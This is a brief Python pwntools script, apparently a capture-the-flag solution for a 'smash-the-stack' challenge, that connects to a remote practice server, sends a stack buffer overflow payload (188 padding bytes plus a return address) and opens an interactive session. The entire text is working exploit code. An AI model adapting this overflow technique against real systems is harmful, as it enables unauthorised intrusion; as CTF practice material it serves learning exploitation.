from pwn import *

#io=process("./smash-the-stack")
io=remote("hackme.inndy.tw",7717)
io.recvline()
payload='a'*188+p32(0x804A060)
io.sendline(payload)
io.interactive()